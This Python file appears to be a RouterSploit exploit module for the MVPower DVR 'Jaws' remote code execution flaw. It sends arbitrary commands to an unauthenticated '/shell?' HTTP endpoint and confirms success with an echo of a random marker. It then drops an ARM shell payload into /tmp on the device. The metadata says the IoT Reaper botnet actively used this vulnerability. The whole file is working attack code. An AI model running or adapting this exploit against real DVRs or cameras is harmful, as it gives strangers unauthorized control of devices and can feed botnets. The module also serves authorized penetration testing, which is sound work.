from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "MVPower DVR Jaws RCE",
        "description": "Module exploits MVPower DVR Jaws RCE vulnerability through 'shell' resource."
                       "Successful exploitation allows remote unauthorized attacker to execute "
                       "commands on operating system level. Vulnerablity was actively used by "
                       "IoT Reaper botnet.",
        "authors": (
            "Paul Davies (UHF-Satcom)",  # initial vulnerability discovery and PoC
            "Andrew Tierney (Pen Test Partners)",  # independent vulnerability discovery and PoC
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/",
            "https://www.pentestpartners.com/security-blog/pwning-cctv-cameras",
        ),
        "devices": (
            "MVPower model TV-7104HE firmware version 1.8.4 115215B9",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            shell(self, architecture="armle", method="echo", location="/tmp")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        path = "/shell?{}".format(cmd)
        response = self.http_request(
            method="GET",
            path=path,
        )

        if response:
            return response.text

        return ""

    @mute
    def check(self):
        mark = utils.random_text(16)
        cmd = "echo {}".format(mark)

        if mark in self.execute(cmd):
            return True  # target is vulnerable

        return False  # target is not vulnerable
